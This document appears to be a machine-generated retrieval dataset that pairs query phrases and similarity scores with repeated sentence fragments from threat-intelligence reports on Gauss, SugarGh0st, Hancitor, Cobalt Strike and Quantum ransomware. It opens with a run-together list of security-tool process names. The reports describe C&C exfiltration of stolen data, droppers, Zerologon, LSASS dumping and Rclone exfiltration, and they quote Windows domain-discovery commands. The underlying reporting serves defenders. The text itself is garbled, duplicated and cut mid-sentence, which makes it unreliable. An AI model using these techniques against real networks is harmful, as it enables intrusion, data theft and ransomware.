EXEcdas2.exezlh.exePacketizer.exeSpyHunter3.execmgrdian.exeadoronsfirewall.exePacketyzer.exewwasher.execonfigmgr.exescfservice.exezanda.exeauthfw.execpd.exescfmanager.exezerospywarele.exedvpapi.exeespwatch.exedltray.exezerospywarelite_installer.execlamd.exefgui.exedlservice.exeWireshark.exesab_wab.exefiledeleter.exeashwebsv.exetshark.exeSUPERAntiSpyware.exefirewall.exeashdisp.exerawshark.exevdtask.exefirewall2004.exeashmaisv.exeEthereal.exeasr.exefirewallgui.exeashserv.exeTethereal.exeNetguardLite.exegateway.exeaswupdsv.exeWindump.exenstzerospywarelite.exehpf_.exeavastui.exeTcpdump.execdinstx.exeiface.exeavastsvc.exeNetcap.execdas17.exeinvent.exeNetmon.exefsrt.exeipcserver.exeCV.exeVSDesktop.exeipctray.exeThe module reads the registry value SOFTWAREMicrosoftWindowsCurrentVersionReliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of additional modules, their names, DLL exports names to call and location of the modules additional files.String values from config file (example)GaussShellNotifyUser ShellNotifyUserEx SetWindowEvent InitShellEx %systemroot%system32winshell.ocx %temp%ws1bin.datGodelInitCache RevertCache ValidateEntry CreateEntry %windir%system32dskapi.ocx %temp%~gdl.tmpUsbDirInitCache RevertCache ValidateEntry CreateEntry %windir%system32smdk.ocx %temp%~mdk.tmpEvery module is loaded and its export functions are called as specified in the configuration.Most of the actions are logged in an encrypted (with XOR) file %temp%~shw.tmp.Sample of decrypted ~shw.tmpAfter loading additional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction loop.Prior to communicating with the C&C, all the information from the other modules log files is copied to the ~shw.tmp file.', 'Paths to the log files are taken from the TimeStampForUI configuration file.As a result, at this stage ~shw.tmp becomes a universal container file containing all the stolen data.It checks Internet connection (https) by accessing URLs specified in its resource 161.It then checks an https connection with www.google.com or www.update.windows.com.', 'If 200 OK is received in reply, it sends a request with the proxy server parameters taken from the prefs.js file of the Mozilla Firefox browser.When an Internet connection is available, it connects to its C&C servers that are specified in resource 131:Connection is established using WinInet API and is performed in two stages:GET request to the server.', 'The response from the server is expected to contain new modules, commands or configuration data.GET[C&amp;Cdomain]/userhome.php?sid=[randomstring]==&amp;uid=VfHx8fHx8fHx8fHx8fHx8fHx8fE=POST request to the server with the contents of the file ~shw.tmp that contains all data collected from the infected computer.The response from the server is decrypted using XOR and 0xACDC as the key.', 'Exfiltrated data is compressed with Zlib.The C&C connection routine is controlled by a DWORD value that is read from the registry value:[HKLMSOFTWAREMicrosoftWindowsCurrentVersionReliability]ShutdownIntervalSnapshotUIThe initial value of the counter is read from resource 181 and is equal to 56.']
a batch script used|0.774783353582313|['After that, the dropped JavaScript is executed using the living-off-the-land binary (LoLBin) cscript.', 'Sample of malicious LNK file.', 'JavaScript dropper The JavaScript dropper is a heavily obfuscated script embedded with base64 encoded data of the other components of the attack.', 'The JavaScript decodes and drops the embedded files into the %TEMP% folder, including a batch script, a customized DLL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundll32 executable from the Windows\\\\SysWow64 folder into the %TEMP% folder.', 'Finally, it executes the batch script loader from the %TEMP% location and runs the customized DLL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16The JavaScript dropper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the commands to run the dropped customized DLL loader.', 'When executed, it sideloads the DLL loader with rundll32.exe and executes the function which is DllUnregisterServer, typically used by COM (Component Object Model) DLLs.', 'The batch script loader.']
a batch script used|0.774783353582313|['After that, the dropped JavaScript is executed using the living-off-the-land binary (LoLBin) cscript.', 'https://blog.talosintelligence.com/new-sugargh0st-rat/ 5/191/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea Sample of malicious LNK file.', 'JavaScript dropper The JavaScript dropper is a heavily obfuscated script embedded with base64 encoded data of the other components of the attack.', 'The JavaScript decodes and drops the embedded files into the %TEMP% folder, including a batch script, a customized DLL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundll32 executable from the Windows\\\\SysWow64 folder into the %TEMP% folder.', 'Finally, it executes the batch script loader from the %TEMP% location and runs the customized DLL loader.', 'The JavaScript deleted itself from the file system afterward.', 'https://blog.talosintelligence.com/new-sugargh0st-rat/ 6/191/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript dropper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the commands to run the dropped customized DLL loader.', 'When executed, it sideloads the DLL loader with rundll32.exe and executes the function which is DllUnregisterServer, typically used by COM (Component Object Model) DLLs.', 'The batch script loader.']
a batch file.|0.7627503885238869|"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications.', '4.', 'Sandman (China) - Sandman APT is likely associated with suspected China-based threat clusters known to use the KEYPLUG backdoor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-0866/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's toolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing collective efforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many commodity loaders were poly- morphic (change their hash on every execution) and supported attackers' hands-on-keyboard activities for information gathering, disabling security settings, and forging the way for ransomware attacks.""]"
C:\Windows\system32\cmd.exe /c|0.7619432530726247|"['Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.', 'In this case it is the number 11985756.Lastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode.', 'After many iterations, the script would deobfuscate and run-in memory.', 'The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.', ']32 for further instructions.Credential AccessThe only credential access observed was through Zerologon, which was used to retrieve the domain administrators NTLM hash.DiscoveryDiscovery started with a port scan initiated by the Hancitor dll.After SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp.', 'The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.This was followed by a battery of discovery command using the built in Microsoft utilities to discover domain controllers, administrators, connectivity checks and other items.C:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group""Domain Admins""/domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping190.114.254.116C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainNotice above, the threat actors pinged 190.114.254[.', ']116 which is one of the Cobalt Strike servers they later used.The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.We observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment.', 'This script used the Active Directory RSAT module to get a list of computers and place them in a file named comps.txt.A program named check.exe was observed using the comps.txt text file.', 'This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP.', 'The online hosts will then be directed to the check.txt text file.The check.exe file contains three parameters that can be used one at a time:check.exe comps.txtcheck.txt -ip (Checkwhichhostsincomps.txtarealive,andwrite the IPtocheck.txt)check.exe comps.txtcheck.txt -name(Checkwhichhostsincomps.txtarealive,andwrite the hostnametocheck.txt)check.exe comps.txtcheck.txt -full(Checkwhichhostsincomps.txtarealive,andwrite the IPandhostnametocheck.txt)Lateral MovementThe threat actors pivoted towards multiple hosts on the domain from the beachhead.', 'The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).']"
C:\Windows\system32\cmd.exe /c|0.8012749828240929|"['The batch scripts came from the first revision ofRevisions quick-disable-windows-defender.bat GitHub, which was used by the ransomware operators without making any changes.Masquerading Example (reference)Obfuscation Example (reference)DiscoveryOnce access is established, threat actors then need to enumerate the victim environment.', 'Common initial discovery tools include Windows built-in utilities (net.exe, nltest.exe, systeminfo, ipconfig, whoami, etc) and theAdFindtool.', 'In a few cases, adversaries attempted to get a listing of open ports/running services on remote hosts by performing port scans using tools such as Advanced IP Scanner and KPortScan 3.0.The first thing we observe from hands-on keyboard operators is usually additional discovery activity.', 'We see threat actors concentrate on searching for the Domain Controllers and general environmental information.The statistics below illustrate the most used Windows tools for enumerating the environment.', 'We compare each tool to the total percent of cases investigated.We see the enumeration commands executed in a short time span, between 1-5 seconds.', 'The execution is usually done through post-exploitation frameworks (Cobalt Strike in most cases).Example screenshot is taken from the case:From Zero to Domain AdminC:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group ""Domain Admins"" /domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping 190.114.254.116  C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainLateral MovementLateral movement is a vital component of threat actor TTPs.', 'Once they get the lay of the land through the discovery methods we outlined above, we repeatedly see them move laterally across the network.', 'Domain Controllers, file shares and similarly high-value servers are primary targets.The number one post-exploitation framework of choice, Cobalt Strike, allows threat actors to leverage different techniques for the purpose of lateral movement.Other common choices for threat attackers include Remote Desktop connections, remote WMI execution of transferred binaries, and the Sysinternals tool PsExec.', '(updated 3/7/22 @ 1330 UTC)WMIC Lateral Movement Example (reference)Psexec Example (reference)Command and ControlOne common theme seen across the majority of the intrusions has been the reliance on Cobalt Strike for performing post-exploitation activities.', 'In almost all cases, the initial access brokers such as Trickbot and Bazar, dropped multiple Cobalt Strike beacons across the victim environment.For an in-depth breakdown of some of the network operations of Cobalt Strike see ourrecent report on the topic.ExfiltrationWhile exfiltration of data was not a common sight in our data set, we observed exfil in 6 of the 20 cases.', 'In the cases where data exfiltration was observed, the threat actors used tools such as RClone, FileZilla, or WinSCP to transfer the data to their controlled servers.']"
C:\Windows\system32\cmd.exe|0.7619432530726247|"['Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.', 'In this case it is the number 11985756.Lastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode.', 'After many iterations, the script would deobfuscate and run-in memory.', 'The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.', ']32 for further instructions.Credential AccessThe only credential access observed was through Zerologon, which was used to retrieve the domain administrators NTLM hash.DiscoveryDiscovery started with a port scan initiated by the Hancitor dll.After SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp.', 'The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.This was followed by a battery of discovery command using the built in Microsoft utilities to discover domain controllers, administrators, connectivity checks and other items.C:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group""Domain Admins""/domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping190.114.254.116C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainNotice above, the threat actors pinged 190.114.254[.', ']116 which is one of the Cobalt Strike servers they later used.The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.We observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment.', 'This script used the Active Directory RSAT module to get a list of computers and place them in a file named comps.txt.A program named check.exe was observed using the comps.txt text file.', 'This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP.', 'The online hosts will then be directed to the check.txt text file.The check.exe file contains three parameters that can be used one at a time:check.exe comps.txtcheck.txt -ip (Checkwhichhostsincomps.txtarealive,andwrite the IPtocheck.txt)check.exe comps.txtcheck.txt -name(Checkwhichhostsincomps.txtarealive,andwrite the hostnametocheck.txt)check.exe comps.txtcheck.txt -full(Checkwhichhostsincomps.txtarealive,andwrite the IPandhostnametocheck.txt)Lateral MovementThe threat actors pivoted towards multiple hosts on the domain from the beachhead.', 'The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).']"
C:\Windows\system32\cmd.exe|0.8012749828240929|"['The batch scripts came from the first revision ofRevisions quick-disable-windows-defender.bat GitHub, which was used by the ransomware operators without making any changes.Masquerading Example (reference)Obfuscation Example (reference)DiscoveryOnce access is established, threat actors then need to enumerate the victim environment.', 'Common initial discovery tools include Windows built-in utilities (net.exe, nltest.exe, systeminfo, ipconfig, whoami, etc) and theAdFindtool.', 'In a few cases, adversaries attempted to get a listing of open ports/running services on remote hosts by performing port scans using tools such as Advanced IP Scanner and KPortScan 3.0.The first thing we observe from hands-on keyboard operators is usually additional discovery activity.', 'We see threat actors concentrate on searching for the Domain Controllers and general environmental information.The statistics below illustrate the most used Windows tools for enumerating the environment.', 'We compare each tool to the total percent of cases investigated.We see the enumeration commands executed in a short time span, between 1-5 seconds.', 'The execution is usually done through post-exploitation frameworks (Cobalt Strike in most cases).Example screenshot is taken from the case:From Zero to Domain AdminC:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group ""Domain Admins"" /domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping 190.114.254.116  C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainLateral MovementLateral movement is a vital component of threat actor TTPs.', 'Once they get the lay of the land through the discovery methods we outlined above, we repeatedly see them move laterally across the network.', 'Domain Controllers, file shares and similarly high-value servers are primary targets.The number one post-exploitation framework of choice, Cobalt Strike, allows threat actors to leverage different techniques for the purpose of lateral movement.Other common choices for threat attackers include Remote Desktop connections, remote WMI execution of transferred binaries, and the Sysinternals tool PsExec.', '(updated 3/7/22 @ 1330 UTC)WMIC Lateral Movement Example (reference)Psexec Example (reference)Command and ControlOne common theme seen across the majority of the intrusions has been the reliance on Cobalt Strike for performing post-exploitation activities.', 'In almost all cases, the initial access brokers such as Trickbot and Bazar, dropped multiple Cobalt Strike beacons across the victim environment.For an in-depth breakdown of some of the network operations of Cobalt Strike see ourrecent report on the topic.ExfiltrationWhile exfiltration of data was not a common sight in our data set, we observed exfil in 6 of the 20 cases.', 'In the cases where data exfiltration was observed, the threat actors used tools such as RClone, FileZilla, or WinSCP to transfer the data to their controlled servers.']"
:\Windows\system32\cmd.exe /C|0.7619432530726247|"['Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.', 'In this case it is the number 11985756.Lastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode.', 'After many iterations, the script would deobfuscate and run-in memory.', 'The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.', ']32 for further instructions.Credential AccessThe only credential access observed was through Zerologon, which was used to retrieve the domain administrators NTLM hash.DiscoveryDiscovery started with a port scan initiated by the Hancitor dll.After SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp.', 'The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.This was followed by a battery of discovery command using the built in Microsoft utilities to discover domain controllers, administrators, connectivity checks and other items.C:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group""Domain Admins""/domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping190.114.254.116C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainNotice above, the threat actors pinged 190.114.254[.', ']116 which is one of the Cobalt Strike servers they later used.The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.We observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment.', 'This script used the Active Directory RSAT module to get a list of computers and place them in a file named comps.txt.A program named check.exe was observed using the comps.txt text file.', 'This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP.', 'The online hosts will then be directed to the check.txt text file.The check.exe file contains three parameters that can be used one at a time:check.exe comps.txtcheck.txt -ip (Checkwhichhostsincomps.txtarealive,andwrite the IPtocheck.txt)check.exe comps.txtcheck.txt -name(Checkwhichhostsincomps.txtarealive,andwrite the hostnametocheck.txt)check.exe comps.txtcheck.txt -full(Checkwhichhostsincomps.txtarealive,andwrite the IPandhostnametocheck.txt)Lateral MovementThe threat actors pivoted towards multiple hosts on the domain from the beachhead.', 'The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).']"
:\Windows\system32\cmd.exe /C|0.8012749828240929|"['The batch scripts came from the first revision ofRevisions quick-disable-windows-defender.bat GitHub, which was used by the ransomware operators without making any changes.Masquerading Example (reference)Obfuscation Example (reference)DiscoveryOnce access is established, threat actors then need to enumerate the victim environment.', 'Common initial discovery tools include Windows built-in utilities (net.exe, nltest.exe, systeminfo, ipconfig, whoami, etc) and theAdFindtool.', 'In a few cases, adversaries attempted to get a listing of open ports/running services on remote hosts by performing port scans using tools such as Advanced IP Scanner and KPortScan 3.0.The first thing we observe from hands-on keyboard operators is usually additional discovery activity.', 'We see threat actors concentrate on searching for the Domain Controllers and general environmental information.The statistics below illustrate the most used Windows tools for enumerating the environment.', 'We compare each tool to the total percent of cases investigated.We see the enumeration commands executed in a short time span, between 1-5 seconds.', 'The execution is usually done through post-exploitation frameworks (Cobalt Strike in most cases).Example screenshot is taken from the case:From Zero to Domain AdminC:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group ""Domain Admins"" /domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping 190.114.254.116  C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainLateral MovementLateral movement is a vital component of threat actor TTPs.', 'Once they get the lay of the land through the discovery methods we outlined above, we repeatedly see them move laterally across the network.', 'Domain Controllers, file shares and similarly high-value servers are primary targets.The number one post-exploitation framework of choice, Cobalt Strike, allows threat actors to leverage different techniques for the purpose of lateral movement.Other common choices for threat attackers include Remote Desktop connections, remote WMI execution of transferred binaries, and the Sysinternals tool PsExec.', '(updated 3/7/22 @ 1330 UTC)WMIC Lateral Movement Example (reference)Psexec Example (reference)Command and ControlOne common theme seen across the majority of the intrusions has been the reliance on Cobalt Strike for performing post-exploitation activities.', 'In almost all cases, the initial access brokers such as Trickbot and Bazar, dropped multiple Cobalt Strike beacons across the victim environment.For an in-depth breakdown of some of the network operations of Cobalt Strike see ourrecent report on the topic.ExfiltrationWhile exfiltration of data was not a common sight in our data set, we observed exfil in 6 of the 20 cases.', 'In the cases where data exfiltration was observed, the threat actors used tools such as RClone, FileZilla, or WinSCP to transfer the data to their controlled servers.']"
C:\Windows\System32\cmd.exe /C|0.7619432530726247|"['Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.', 'In this case it is the number 11985756.Lastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode.', 'After many iterations, the script would deobfuscate and run-in memory.', 'The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.', ']32 for further instructions.Credential AccessThe only credential access observed was through Zerologon, which was used to retrieve the domain administrators NTLM hash.DiscoveryDiscovery started with a port scan initiated by the Hancitor dll.After SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp.', 'The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.This was followed by a battery of discovery command using the built in Microsoft utilities to discover domain controllers, administrators, connectivity checks and other items.C:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group""Domain Admins""/domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping190.114.254.116C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainNotice above, the threat actors pinged 190.114.254[.', ']116 which is one of the Cobalt Strike servers they later used.The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.We observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment.', 'This script used the Active Directory RSAT module to get a list of computers and place them in a file named comps.txt.A program named check.exe was observed using the comps.txt text file.', 'This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP.', 'The online hosts will then be directed to the check.txt text file.The check.exe file contains three parameters that can be used one at a time:check.exe comps.txtcheck.txt -ip (Checkwhichhostsincomps.txtarealive,andwrite the IPtocheck.txt)check.exe comps.txtcheck.txt -name(Checkwhichhostsincomps.txtarealive,andwrite the hostnametocheck.txt)check.exe comps.txtcheck.txt -full(Checkwhichhostsincomps.txtarealive,andwrite the IPandhostnametocheck.txt)Lateral MovementThe threat actors pivoted towards multiple hosts on the domain from the beachhead.', 'The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).']"
C:\Windows\System32\cmd.exe /C|0.8012749828240929|"['The batch scripts came from the first revision ofRevisions quick-disable-windows-defender.bat GitHub, which was used by the ransomware operators without making any changes.Masquerading Example (reference)Obfuscation Example (reference)DiscoveryOnce access is established, threat actors then need to enumerate the victim environment.', 'Common initial discovery tools include Windows built-in utilities (net.exe, nltest.exe, systeminfo, ipconfig, whoami, etc) and theAdFindtool.', 'In a few cases, adversaries attempted to get a listing of open ports/running services on remote hosts by performing port scans using tools such as Advanced IP Scanner and KPortScan 3.0.The first thing we observe from hands-on keyboard operators is usually additional discovery activity.', 'We see threat actors concentrate on searching for the Domain Controllers and general environmental information.The statistics below illustrate the most used Windows tools for enumerating the environment.', 'We compare each tool to the total percent of cases investigated.We see the enumeration commands executed in a short time span, between 1-5 seconds.', 'The execution is usually done through post-exploitation frameworks (Cobalt Strike in most cases).Example screenshot is taken from the case:From Zero to Domain AdminC:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group ""Domain Admins"" /domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping 190.114.254.116  C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainLateral MovementLateral movement is a vital component of threat actor TTPs.', 'Once they get the lay of the land through the discovery methods we outlined above, we repeatedly see them move laterally across the network.', 'Domain Controllers, file shares and similarly high-value servers are primary targets.The number one post-exploitation framework of choice, Cobalt Strike, allows threat actors to leverage different techniques for the purpose of lateral movement.Other common choices for threat attackers include Remote Desktop connections, remote WMI execution of transferred binaries, and the Sysinternals tool PsExec.', '(updated 3/7/22 @ 1330 UTC)WMIC Lateral Movement Example (reference)Psexec Example (reference)Command and ControlOne common theme seen across the majority of the intrusions has been the reliance on Cobalt Strike for performing post-exploitation activities.', 'In almost all cases, the initial access brokers such as Trickbot and Bazar, dropped multiple Cobalt Strike beacons across the victim environment.For an in-depth breakdown of some of the network operations of Cobalt Strike see ourrecent report on the topic.ExfiltrationWhile exfiltration of data was not a common sight in our data set, we observed exfil in 6 of the 20 cases.', 'In the cases where data exfiltration was observed, the threat actors used tools such as RClone, FileZilla, or WinSCP to transfer the data to their controlled servers.']"
began their first lateral movement to a server in the environment by copying their Cobalt Strike DLL over to the host and executing it|0.8978275223679375|['Around 16 hours after the initial execution, the first Cobalt Strike beacon DLL was executed from the IcedID malware.', 'This led to another round of discovery using net followed byAdFind.The threat actor installed Atera and Splashtop remote access software via an MSI file.', 'After that, the threat actors tried a GetSystem privilege escalation technique, which was blocked by antivirus.', 'The threat actor then proceeded to exploit CVE-2020-1472 (ZeroLogon).', 'This was followed by a batch script used to perform DNS lookups on hosts across the environment.', 'After this, the threat actors began their first lateral movement to a server in the environment by copying their Cobalt Strike DLL over to the host and executing it via a remote service.', 'They then repeated the install of the remote access software package.Some two hours later, another Cobalt Strike beacon was executed.', 'With this beacon, the threat actors succeeded in elevating to SYSTEM on the beachhead host and proceeded to dump LSASS memory.', 'Another round of activity took place using system tools, batch files, and Adget.', 'Several more beacons were also loaded on the host using DLLs and PowerShell.At this point, the threat actors had the clear text credentials for one of the domain administrator accounts and began moving laterally to other systems.', 'They issued remote commands using WMIC to conduct discovery, as well as distribute and execute Cobalt Strike beacons.']
the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control.|0.9114781637791165|['When they returned, several more Cobalt Strike beacons were launched and several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable and a PowerShell implementation.', 'For the next several hours, repeats of previous discovery actions and additional beacons executed using remote WMIC commands, were observed.', 'During this time, Windows event logs point to the threat actors completing DCSync activities on one of the domain controllers.', 'A new batch file, localdisk.bat, was also executed using remote WMI commands, to collect disk data on hosts around the environment.', 'These discovery actions were completed several times again in other various batch files.On the start of the fourth day, the threat actors continued to repeat their previous discovery and beacon spreading activity.', 'Near the end of the day, the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control.', 'Next, the threat actor executed PowerShell to pop up an alert message on several hosts, letting the user know that the machine was infected with Cobalt Strike.After completing this activity, they used Rclone to exfiltrate copies of the backup files to theMega.iocloud storage service.', 'The threat actors then staged a ransomware binary on the backup server but did not immediately execute it.Around two hours after dropping the file, it was executed using a command line argument, which included a list of hosts to target.', 'This appeared to fail.', 'The threat actors then proceeded to execute the payload manually in several ways, across various hosts.', 'Finally, they connected to a domain controller and dropped three scripts; one to copy the ransomware executable to all hosts, one to reset every users password in the organization, and a final one to execute the staged ransomware payload using PsExec.Once executed, the ransomware left the ransom note README_TO_DECRYPT.html, which informs the victim that Quantum ransomware is responsible for the intrusion.']
they connected to a domain controller and dropped three scripts; one to copy the ransomware executable to all hosts, one to reset every users password in the organization, and a final one to execute the staged ransomware payload using PsExec|0.7926866219974517|['Near the end of the day, the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control.', 'Next, the threat actor executed PowerShell to pop up an alert message on several hosts, letting the user know that the machine was infected with Cobalt Strike.After completing this activity, they used Rclone to exfiltrate copies of the backup files to theMega.iocloud storage service.', 'The threat actors then staged a ransomware binary on the backup server but did not immediately execute it.Around two hours after dropping the file, it was executed using a command line argument, which included a list of hosts to target.', 'This appeared to fail.', 'The threat actors then proceeded to execute the payload manually in several ways, across various hosts.', 'Finally, they connected to a domain controller and dropped three scripts; one to copy the ransomware executable to all hosts, one to reset every users password in the organization, and a final one to execute the staged ransomware payload using PsExec.Once executed, the ransomware left the ransom note README_TO_DECRYPT.html, which informs the victim that Quantum ransomware is responsible for the intrusion.', 'The time to ransomware was just over 78 hours from the initial IcedID infection.', 'All domain joined systems were encrypted with Quantum ransomware.AnalystsAnalysis and reporting completed by@_pete_0and@MetallicHack.This intrusion began by the execution of a malicious LNK embedded in an ISO file (masquerading as a folder).', 'The ISO file was delivered as a ZIP archive via a malicious spam mail campaign.Malicious ISO fileFirst, the user clicked on the ISO file, which created a new virtual hard drive disk.', 'Such activity can be tracked with Event 12 from Microsoft-Windows-VHDMP/Operational.This ISO file contains a LNK named documents and a hidden directory named max containing a cobalt strike DLL beacon and a batch file.As we can see below using LECmd by Eric Zimmerman, the file documents.lnk points to max\\\\eyewear.bat.As a consequence, when the victim clicked on the LNK file, it triggered the execution of the batch file eyewear.batThe batch file eyewear.bat then executed two commands:It first moved a DLL file named 